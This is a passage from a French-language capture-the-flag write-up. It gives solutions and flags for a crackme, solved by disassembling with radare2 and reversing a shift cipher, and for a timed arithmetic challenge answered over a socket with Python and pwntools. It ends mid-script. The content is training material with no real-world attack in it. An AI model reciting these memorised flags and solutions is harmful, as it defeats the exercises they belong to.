&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{st3g4N0gr4phY_c4N_b3_r3AllY_s1mpl3}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-crackme1&quot;&gt;150 Crackme1&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Grab you tools and crack me this file Billy !&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 ./crack_me1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; aaa
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; afl
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; s main
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pdf
0x00001171      48b86861636b.  movabs rax, 0x616d72656b636168 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'hackerma'&lt;/span&gt;
0x0000117b      488945ce       mov qword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s], rax
0x0000117f      66c745d66e00   mov word &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_2ah], 0x6e  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'n'&lt;/span&gt;
0x00001185      c645b09e       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_50h], 0x9e
0x00001189      c645b1a2       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4fh], 0xa2
0x0000118d      c645b2a9       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4eh], 0xa9
0x00001191      c645b3a1       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4dh], 0xa1
0x00001195      c645b499       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4ch], 0x99
0x00001199      c645b5d0       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4bh], 0xd0
0x0000119d      c645b6ae       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_4ah], 0xae
0x000011a1      c645b785       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_49h], 0x85
0x000011a5      c645b8ca       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_48h], 0xca
0x000011a9      c645b996       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_47h], 0x96
0x000011ad      c645bac7       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_46h], 0xc7
0x000011b1      c645bb88       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_45h], 0x88
0x000011b5      c645bc89       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_44h], 0x89
0x000011b9      c645bd9d       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_43h], 0x9d
0x000011bd      c645be89       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_42h], 0x89
0x000011c1      c645bfb8       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_41h], 0xb8
0x000011c5      c645c0c0       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_40h], 0xc0
0x000011c9      c645c188       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_3fh], 0x88
0x000011cd      c645c2c7       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_3eh], 0xc7
0x000011d1      c645c39d       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_3dh], 0x9d
0x000011d5      c645c489       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_3ch], 0x89
0x000011d9      c645c5c7       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_3bh], 0xc7
0x000011dd      c645c6c7       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_3ah], 0xc7
0x000011e1      c645c7ce       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_39h], 0xce
0x000011e5      c645c8d2       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_38h], 0xd2
0x000011e9      c645c900       mov byte &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_37h], 0
0x000011ed      c745ec000000.  mov dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;local_14h], 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# on sait que le format du flag est IMTLD{...}
# python3
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'M'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;nous avons donc un delta de 4 entre ces deux valeurs&lt;/li&gt;
  &lt;li&gt;on remarque qu’il y a aussi un delta de 4 entre 0x9e (=158) et 0xa2 (=162)&lt;/li&gt;
  &lt;li&gt;c’est un chiffrement par décalage de 85&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xae&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xca&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Y0uAr34H4ck3rH4rry}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-menthal-arithmetic&quot;&gt;150 Menthal arithmetic&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;I hope you’re fast
Host 	51.75.202.113
Port 	10001&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 51.75.202.113 10001
Welcome &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;
You must calculate the square root of the 1st number, multiply the result by the cube of the 2nd number and send the integer part of the final result...
I almost forget, you only have 2 seconds to send me the result
1st number : 2077
2nd number : 3373
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;math&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;serv_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'51.75.202.113'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serv_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Connection problem'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;recv1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;recv2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'nb1 -&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'nb2 -&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;nb1_square&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'nb1_square -&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb1_square&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;nb2_cube&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'nb2_cube -&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2_cube&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb1_square&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb2_cube&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'res -&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;res_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'int(res) -&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Autre version&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;math&lt;/span&gt;  &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;51.75.202.113&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;n1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;n2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
